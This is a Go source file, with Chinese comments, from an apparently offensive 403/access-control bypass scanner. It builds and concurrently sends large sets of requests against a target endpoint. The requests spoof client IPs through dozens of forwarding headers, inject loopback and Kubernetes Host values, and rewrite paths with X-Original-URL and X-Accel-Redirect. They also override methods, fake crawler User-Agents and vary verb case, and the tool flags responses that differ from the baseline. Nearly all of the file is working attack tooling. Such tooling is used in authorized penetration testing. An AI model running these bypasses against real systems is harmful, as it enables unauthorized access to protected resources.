package lib

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
)

// bypassIPHeaders 用于 IP 伪造的请求头
// ref: iamj0ker/bypass-403, nomore403 headers file, CSDN 20个403 bypass
var bypassIPHeaders = []string{
	// 经典 XFF 系列
	"X-Forwarded-For",
	"X-Forward-For",
	"X-Forwarded",
	"X-Forwarded-By",
	"X-Forwarded-Host",
	"X-Forwarded-Server",
	"Forwarded-For",
	"Forwarded",
	"X-Forwarded-For-Original",
	"X-Forwarder-For",
	// IP 标识头
	"X-Originating-IP",
	"X-Remote-IP",
	"X-Remote-Addr",
	"X-Real-IP",
	"X-True-IP",
	"True-Client-IP",
	"Client-IP",
	"Cluster-Client-IP",
	"X-Client-IP",
	"X-Custom-IP-Authorization",
	"X-ProxyUser-Ip",
	"X-Original-Remote-Addr",
	"CF-Connecting-IP",
	"Fastly-Client-Ip",
	"X-Host",
	"Real-Ip",
	// nomore403 新增头
	"Base-Url",
	"Http-Url",
	"Proxy-Url",
	"X-Proxy-Url",
	"X-Arbitrary",
	"X-Originally-Forwarded-For",
	"Redirect",
	"X-WAP-Profile",
	"Profile",
	"Destination",
	"Request-Uri",
	"Uri",
	"Url",
	"X-Forward",
	"X-HTTP-DestinationURL",
	"X-HTTP-Host-Override",
	"Proxy",
	"Proxy-Host",
	"Origin",
	"X-Referrer",
}

// bypassIPValues 伪造 IP 值（含 IPv6、编码变体、scheme 前缀）
var bypassIPValues = []string{
	// 标准 IPv4
	"127.0.0.1",
	"127.0.0.1:80",
	"127.0.0.1:443",
	"127.0.0.1:8080",
	"localhost",
	"0.0.0.0",
	"0",
	// 内网段
	"10.0.0.1",
	"172.16.0.1",
	"192.168.0.1",
	"192.168.1.1",
	// IPv6 回环（ref: iamj0ker/bypass-403, CSDN 20个403 bypass）
	"::1",
	"[::1]",
	"0000::1",
	// IPv4 短形式 & 编码变体（ref: CSDN, Medium WAF bypass 2025）
	"127.1",
	"0x7f000001",
	"2130706433",
	"0177.0.0.1",
	// 带 scheme 前缀（ref: iamj0ker/bypass-403）
	"http://127.0.0.1",
	"https://127.0.0.1",
}

// bypassPathHeaders 用于路径重写的请求头
// ref: nomore403, 403权限绕过另类思路
var bypassPathHeaders = []string{
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Override-URL",
	"X-Accel-Redirect",  // Nginx 内部重定向头（ref: 403权限绕过另类思路）
	"X-Forwarded-Path",  // 路径转发头
}

// methodOverrideHeaders 方法覆盖头
var methodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
}

// testCase 表示一个测试用例
type testCase struct {
	method  string
	url     string
	headers map[string]string
	desc    string
}

// HeaderBypassStart 使用 HTTP Header 绕过技术进行测试
func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBaseline Baseline) SheetData {
	result := SheetData{
		Name:    "Header/Method 测试",
		Headers: []string{"绕过技术", "URL", "响应长度", "状态码", "判定"},
	}

	fmt.Println(Blue("[+] Header Bypass poc 开始测试"))

	if strings.HasSuffix(url, "/") {
		url = strings.TrimSuffix(url, "/")
	}

	// 先获取原始响应作为基准
	resp, err := HttpClient.Get(url + auth)
	if err != nil {
		fmt.Printf(Red("[-] 请求原始鉴权接口失败: %s\n"), err)
		return result
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return result
	}
	origLen := len(body)
	origCode := resp.StatusCode
	fmt.Printf(Green("[+] 原始鉴权接口 %s 的响应: len=%d code=%d\n"), url+auth, origLen, origCode)

	// 构建双基线判定上下文
	ctx := ClassifyContext{
		Auth:   Baseline{Code: origCode, Len: origLen},
		NoAuth: noauthBaseline,
	}

	var cases []testCase
	var preExportData [][]string // 阶段一已完成的结果（IP 伪造粗筛）

	// 1. IP 伪造 Header 绕过（两阶段探测）
	// 阶段一: 每个 IP 值发 1 个请求，一次性携带所有 40+ 个伪造头（22 请求代替 880+）
	// 阶段二: 仅对命中的 IP 值逐头拆分，精确定位生效的 Header
	ipCases, ipExport := buildIPSpoofCases(url+auth, ctx, thread, debug)
	cases = append(cases, ipCases...)
	preExportData = append(preExportData, ipExport...)

	// 2. 路径重写 Header 绕过
	for _, header := range bypassPathHeaders {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + noauth,
			headers: map[string]string{header: auth},
			desc:    fmt.Sprintf("PathRewrite[%s: %s]", header, auth),
		})
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + "/",
			headers: map[string]string{header: auth},
			desc:    fmt.Sprintf("PathRewrite[%s: %s] via /", header, auth),
		})
	}

	// 3. 方法覆盖 Header（通过 GET 请求 + Override 头模拟其他方法）
	for _, header := range methodOverrideHeaders {
		for _, method := range []string{"GET", "POST", "PUT", "PATCH", "DELETE"} {
			cases = append(cases, testCase{
				method:  "GET",
				url:     url + auth,
				headers: map[string]string{header: method},
				desc:    fmt.Sprintf("MethodOverride[%s: %s]", header, method),
			})
		}
	}

	// 4. Referer 伪造
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + auth,
		headers: map[string]string{"Referer": url + auth},
		desc:    "Referer[self]",
	})
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + auth,
		headers: map[string]string{"Referer": url + "/"},
		desc:    "Referer[root]",
	})

	// 5. Content-Length: 0 + POST
	cases = append(cases, testCase{
		method:  "POST",
		url:     url + auth,
		headers: map[string]string{"Content-Length": "0"},
		desc:    "POST+Content-Length:0",
	})

	// 6. Host 头注入（ref: CSDN 20个403 bypass, 掘金）
	// 某些反向代理根据 Host 头做访问控制，注入 localhost 可绕过
	for _, hostVal := range []string{"localhost", "127.0.0.1", "0.0.0.0"} {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + auth,
			headers: map[string]string{"Host": hostVal},
			desc:    fmt.Sprintf("Host[%s]", hostVal),
		})
	}

	// 7. X-Forwarded-Proto/Port/Scheme（ref: CSDN, Medium WAF bypass 2025）
	// 某些中间件根据协议/端口做策略，伪造可绕过 HTTPS-only 或端口限制
	for _, proto := range []string{"https", "http", "ws", "wss"} {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + auth,
			headers: map[string]string{"X-Forwarded-Proto": proto},
			desc:    fmt.Sprintf("X-Forwarded-Proto[%s]", proto),
		})
	}
	for _, port := range []string{"80", "443", "8080", "8443", "4443"} {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + auth,
			headers: map[string]string{"X-Forwarded-Port": port},
			desc:    fmt.Sprintf("X-Forwarded-Port[%s]", port),
		})
	}
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + auth,
		headers: map[string]string{"X-Forwarded-Scheme": "https"},
		desc:    "X-Forwarded-Scheme[https]",
	})

	// 8. User-Agent 伪装（ref: Medium WAF bypass, CSDN）
	// 部分 WAF/ACL 白名单搜索引擎爬虫和内部监控 UA
	spoofUAs := []string{
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
		"curl/7.68.0",
		"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
	}
	for _, ua := range spoofUAs {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + auth,
			headers: map[string]string{"User-Agent": ua},
			desc:    fmt.Sprintf("UserAgent[%s]", truncateStr(ua, 40)),
		})
	}

	// 9. Transfer-Encoding: chunked（ref: Medium WAF bypass 2025）
	// 某些 WAF 不检查 chunked 编码的请求体
	cases = append(cases, testCase{
		method: "POST",
		url:    url + auth,
		headers: map[string]string{
			"Transfer-Encoding": "chunked",
			"Content-Type":      "application/x-www-form-urlencoded",
		},
		desc: "POST+Transfer-Encoding:chunked",
	})

	// 10. Accept 头操纵（ref: Medium WAF bypass）
	// 不同 Accept 头可能触发不同的处理链路
	for _, accept := range []string{"application/json", "text/html", "*/*", "application/xml"} {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + auth,
			headers: map[string]string{"Accept": accept},
			desc:    fmt.Sprintf("Accept[%s]", accept),
		})
	}

	// 11. 多头组合攻击（实战高效 — 同时注入多个绕过头增加命中率）
	cases = append(cases, testCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"X-Forwarded-For":  "127.0.0.1",
			"X-Real-IP":        "127.0.0.1",
			"X-Originating-IP": "127.0.0.1",
		},
		desc: "Combo[XFF+RealIP+OriginIP=127.0.0.1]",
	})
	cases = append(cases, testCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"X-Forwarded-For":   "127.0.0.1",
			"X-Forwarded-Host":  "127.0.0.1",
			"X-Forwarded-Proto": "https",
		},
		desc: "Combo[XFF+XFHost+Proto]",
	})
	cases = append(cases, testCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"X-Original-URL":             auth,
			"X-Custom-IP-Authorization":  "127.0.0.1",
			"X-Forwarded-For":            "127.0.0.1",
		},
		desc: "Combo[OrigURL+CustomIP+XFF]",
	})

	// 13. Verb-Case 切换（ref: nomore403, 403权限绕过另类思路）
	// 某些 WAF/中间件对 HTTP 方法大小写敏感，变体可绕过
	verbCaseVariants := []string{"gEt", "GeT", "GEt", "gET", "get", "Get"}
	for _, verb := range verbCaseVariants {
		cases = append(cases, testCase{
			method:  verb,
			url:     url + auth,
			headers: nil,
			desc:    fmt.Sprintf("VerbCase[%s]", verb),
		})
	}

	// 14. X-Accel-Redirect + Nginx 内部路由组合（ref: 403权限绕过另类思路）
	// Nginx 的 X-Accel-Redirect 可触发内部 location 跳转，绕过前端 ACL
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + noauth,
		headers: map[string]string{"X-Accel-Redirect": auth},
		desc:    fmt.Sprintf("X-Accel-Redirect[%s]", auth),
	})
	// 配合内部路径
	cases = append(cases, testCase{
		method:  "GET",
		url:     url + "/",
		headers: map[string]string{"X-Accel-Redirect": "/internal" + auth},
		desc:    fmt.Sprintf("X-Accel-Redirect[/internal%s]", auth),
	})

	// 15. k8s / 服务网格 Host 注入（ref: 403权限绕过另类思路）
	// k8s 环境中可通过注入内部 Service Host 绕过 Ingress 层的访问控制
	k8sHosts := []string{
		"kubernetes.default.svc",
		"localhost:8080",
		"127.0.0.1:8443",
		"0.0.0.0:80",
		"[::1]:8080",
	}
	for _, kh := range k8sHosts {
		cases = append(cases, testCase{
			method:  "GET",
			url:     url + auth,
			headers: map[string]string{"Host": kh},
			desc:    fmt.Sprintf("K8sHost[%s]", kh),
		})
	}

	// 16. HTTP/1.0 降级模拟（ref: nomore403, 403权限绕过另类思路）
	// 某些 WAF/反代只检查 HTTP/1.1，HTTP/1.0 请求可绕过
	// Go 的 net/http 不直接支持设置 HTTP 版本，但我们可以通过 header 模拟
	// 部分中间件通过 Via 头判断协议版本
	cases = append(cases, testCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"Via":            "1.0 localhost",
			"X-Forwarded-Proto": "http",
		},
		desc: "HTTPDowngrade[Via:1.0+Proto:http]",
	})

	// 17. 扩展多头组合攻击（ref: nomore403, 403权限绕过另类思路）
	cases = append(cases, testCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"X-Forwarded-For":    "127.0.0.1",
			"X-Real-IP":          "127.0.0.1",
			"X-Original-URL":     auth,
			"X-Rewrite-URL":      auth,
			"X-Forwarded-Proto":  "https",
		},
		desc: "Combo[XFF+RealIP+OrigURL+RewriteURL+Proto]",
	})
	cases = append(cases, testCase{
		method: "GET",
		url:    url + noauth,
		headers: map[string]string{
			"X-Original-URL":    auth,
			"X-Accel-Redirect":  auth,
			"X-Forwarded-For":   "127.0.0.1",
		},
		desc: "Combo[OrigURL+Accel+XFF via noauth]",
	})
	cases = append(cases, testCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"X-Forwarded-For":       "127.0.0.1",
			"X-Forwarded-Host":      "localhost",
			"X-Forwarded-Proto":     "https",
			"X-Forwarded-Port":      "443",
			"X-Real-IP":             "127.0.0.1",
			"True-Client-IP":        "127.0.0.1",
			"CF-Connecting-IP":      "127.0.0.1",
			"X-Custom-IP-Authorization": "127.0.0.1",
		},
		desc: "Combo[AllIPHeaders=127.0.0.1]",
	})

	// 18. 智能 HTTP 方法测试: 先 GET/POST，都被拦截则 OPTIONS 探测后精准测试
	methodCases := discoverAndBuildMethodCases(url+auth, origLen, origCode, debug)
	cases = append(cases, methodCases...)

	total := len(cases)
	fmt.Printf(Blue("[+] 共生成 %d 个 Header/Method 测试用例\n"), total)

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, thread)
	mu := &sync.Mutex{}
	var exportData [][]string
	seen := make(map[string]bool)
	var completed int64

	for _, tc := range cases {
		wg.Add(1)
		go func(tc testCase) {
			defer wg.Done()

			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			req, err := http.NewRequest(tc.method, tc.url, bytes.NewBuffer([]byte{}))
			if err != nil {
				return
			}

			for k, v := range tc.headers {
				req.Header.Set(k, v)
			}

			resp, err := HttpClient.Do(req)
			current := atomic.AddInt64(&completed, 1)
			if err != nil {
				if debug == 1 {
					mu.Lock()
					fmt.Printf(Yellow("[!] %s 请求失败 [%d/%d]: %s\n"), tc.desc, current, total, err)
					mu.Unlock()
				}
				return
			}
			defer resp.Body.Close()

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return
			}

			// 提取响应元数据
			bodySnippet := truncateBody(body, 4096)
			location := resp.Header.Get("Location")

			newLen := len(body)
			newCode := resp.StatusCode
			classification := ClassifyResult(ctx, newCode, newLen, bodySnippet, location)

			mu.Lock()
			defer mu.Unlock()

			if current%100 == 0 || int(current) == total {
				fmt.Printf(Blue("[*] Header/Method 进度: [%d/%d]\n"), current, total)
			}

			if debug == 1 {
				fmt.Printf(Green("[+] %s: len=%d code=%d → %s\n"), tc.desc, newLen, newCode, classification)
				key := fmt.Sprintf("%s|%d|%d", tc.desc, newLen, newCode)
				if !seen[key] {
					seen[key] = true
					exportData = append(exportData, []string{
						tc.desc,
						tc.url,
						fmt.Sprintf("%d", newLen),
						fmt.Sprintf("%d", newCode),
						classification,
					})
				}
			} else if (newLen != origLen || newCode != origCode) && newCode != 404 {
				fmt.Printf(Green("[+] %s: len=%d code=%d → %s\n"), tc.desc, newLen, newCode, classification)
				key := fmt.Sprintf("%s|%d|%d", tc.desc, newLen, newCode)
				if !seen[key] {
					seen[key] = true
					exportData = append(exportData, []string{
						tc.desc,
						tc.url,
						fmt.Sprintf("%d", newLen),
						fmt.Sprintf("%d", newCode),
						classification,
					})
				}
			}
		}(tc)
	}

	wg.Wait()

	// 合并阶段一预导出的结果 + 主循环产出的结果
	allExportData := append(preExportData, exportData...)
	result.Data = allExportData
	result.TotalPayloads = total + len(bypassIPValues) // 加上阶段一的探针数
	return result
}

// buildIPSpoofCases 两阶段 IP 伪造探测
// 阶段一（粗筛）: 每个 IP 值 1 个请求，携带所有 IP 伪造头 → 22 请求
// 阶段二（精确定位）: 仅对响应异常的 IP 值，逐头拆分确认哪个 Header 生效
// 返回值: (需要主循环执行的 testCase, 阶段一已产出的 exportData 行)
func buildIPSpoofCases(targetURL string, ctx ClassifyContext, thread, debug int) ([]testCase, [][]string) {
	origAuth := ctx.Auth

	// ═══ 阶段一: 粗筛 ═══
	fmt.Printf(Blue("[+] IP 伪造阶段一: 每个 IP 携带全部 %d 个伪造头，共 %d 个探针请求\n"),
		len(bypassIPHeaders), len(bypassIPValues))

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, thread)
	mu := &sync.Mutex{}
	var hitIPs []string
	var phase1Export [][]string
	var phase1Count int64

	for _, ip := range bypassIPValues {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			// 构建携带所有 IP 伪造头的请求
			req, err := http.NewRequest("GET", targetURL, bytes.NewBuffer([]byte{}))
			if err != nil {
				return
			}
			for _, header := range bypassIPHeaders {
				req.Header.Set(header, ip)
			}

			resp, err := HttpClient.Do(req)
			current := atomic.AddInt64(&phase1Count, 1)
			if err != nil {
				if debug == 1 {
					mu.Lock()
					fmt.Printf(Yellow("[!] IPProbe[%s] 请求失败: %s\n"), ip, err)
					mu.Unlock()
				}
				return
			}
			defer resp.Body.Close()

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return
			}

			newLen := len(body)
			newCode := resp.StatusCode
			isHit := (newLen != origAuth.Len || newCode != origAuth.Code) && newCode != 404
			desc := fmt.Sprintf("IPProbe[ALL_%d_HEADERS=%s]", len(bypassIPHeaders), ip)

			mu.Lock()
			defer mu.Unlock()

			if isHit {
				hitIPs = append(hitIPs, ip)
				bodySnippet := truncateBody(body, 4096)
				location := resp.Header.Get("Location")
				classification := ClassifyResult(ctx, newCode, newLen, bodySnippet, location)

				fmt.Printf(Green("[+] 阶段一命中: %s len=%d code=%d → %s\n"), desc, newLen, newCode, classification)
				phase1Export = append(phase1Export, []string{
					desc, targetURL,
					fmt.Sprintf("%d", newLen),
					fmt.Sprintf("%d", newCode),
					classification,
				})
			} else if debug == 1 {
				fmt.Printf("[*] 阶段一无差异 [%d/%d]: %s len=%d code=%d\n",
					current, len(bypassIPValues), desc, newLen, newCode)
			}
		}(ip)
	}
	wg.Wait()

	// ═══ 阶段二: 精确定位 ═══
	if len(hitIPs) == 0 {
		fmt.Println(Blue("[*] IP 伪造阶段一: 全部 IP 值无响应差异，跳过阶段二（节省 880+ 请求）"))
		return nil, phase1Export
	}

	fmt.Printf(Blue("[+] IP 伪造阶段二: %d 个 IP 命中，逐头拆分定位 (共 %d 个请求)\n"),
		len(hitIPs), len(hitIPs)*len(bypassIPHeaders))

	var phase2Cases []testCase
	for _, ip := range hitIPs {
		for _, header := range bypassIPHeaders {
			phase2Cases = append(phase2Cases, testCase{
				method:  "GET",
				url:     targetURL,
				headers: map[string]string{header: ip},
				desc:    fmt.Sprintf("IPDrillDown[%s: %s]", header, ip),
			})
		}
	}

	return phase2Cases, phase1Export
}

// discoverAndBuildMethodCases 智能探测 HTTP 方法
// 逻辑: GET/POST 已在主流程中测试，这里只做 OPTIONS 探测并按 Allow 头精准生成用例
func discoverAndBuildMethodCases(targetURL string, origLen, origCode, debug int) []testCase {
	var cases []testCase

	// 已知被拦截的状态码（说明 GET/POST 不行，需要探测其他方法）
	blocked := origCode == 401 || origCode == 403 || origCode == 405 || origCode == 302 || origCode == 301

	if !blocked {
		// GET 就能访问，不需要再测其他方法
		if debug == 1 {
			fmt.Printf(Blue("[*] GET 未被拦截 (code=%d)，跳过 HTTP 方法探测\n"), origCode)
		}
		return cases
	}

	fmt.Println(Blue("[+] GET/POST 被拦截，发送 OPTIONS 探测服务端支持的 HTTP 方法..."))

	// 发送 OPTIONS 请求
	req, err := http.NewRequest("OPTIONS", targetURL, nil)
	if err != nil {
		return cases
	}

	resp, err := HttpClient.Do(req)
	if err != nil {
		if debug == 1 {
			fmt.Printf(Yellow("[!] OPTIONS 请求失败: %s\n"), err)
		}
		// OPTIONS 失败，回退测试几个常见方法
		return buildFallbackMethodCases(targetURL)
	}
	defer resp.Body.Close()

	// 解析 Allow 头
	allow := resp.Header.Get("Allow")
	if allow == "" {
		// 有些服务器用 Access-Control-Allow-Methods
		allow = resp.Header.Get("Access-Control-Allow-Methods")
	}

	fmt.Printf(Green("[+] OPTIONS 响应: code=%d, Allow: %s\n"), resp.StatusCode, allow)

	if allow == "" {
		if debug == 1 {
			fmt.Println(Yellow("[!] 服务端未返回 Allow 头，回退测试常见方法"))
		}
		return buildFallbackMethodCases(targetURL)
	}

	// 解析 Allow 头中的方法列表
	allowedMethods := parseAllowHeader(allow)

	// 排除已经测试过的 GET 和 POST，只测试服务端声明支持的其他方法
	skip := map[string]bool{"GET": true, "POST": true, "OPTIONS": true}

	for _, method := range allowedMethods {
		method = strings.TrimSpace(strings.ToUpper(method))
		if skip[method] || method == "" {
			continue
		}
		cases = append(cases, testCase{
			method:  method,
			url:     targetURL,
			headers: nil,
			desc:    fmt.Sprintf("Method[%s] (OPTIONS探测)", method),
		})
	}

	if len(cases) == 0 {
		fmt.Println(Blue("[*] OPTIONS 返回的方法中无额外可测方法"))
	} else {
		fmt.Printf(Blue("[+] 根据 OPTIONS 响应，将测试以下方法: %v\n"), methodNames(cases))
	}

	return cases
}

// buildFallbackMethodCases OPTIONS 不可用时，回退测试少量常见方法
func buildFallbackMethodCases(targetURL string) []testCase {
	// 只测试最有可能产生差异的几个方法，不盲测全部
	fallbackMethods := []string{"PUT", "PATCH", "HEAD", "TRACE"}

	fmt.Printf(Blue("[+] OPTIONS 不可用，回退测试: %v\n"), fallbackMethods)

	var cases []testCase
	for _, method := range fallbackMethods {
		cases = append(cases, testCase{
			method:  method,
			url:     targetURL,
			headers: nil,
			desc:    fmt.Sprintf("Method[%s] (回退探测)", method),
		})
	}
	return cases
}

// parseAllowHeader 解析 Allow 头，支持逗号分隔
func parseAllowHeader(allow string) []string {
	parts := strings.Split(allow, ",")
	var methods []string
	for _, p := range parts {
		m := strings.TrimSpace(p)
		if m != "" {
			methods = append(methods, m)
		}
	}
	return methods
}

// methodNames 从 testCase 列表中提取方法名
func methodNames(cases []testCase) []string {
	var names []string
	for _, c := range cases {
		names = append(names, c.method)
	}
	return names
}
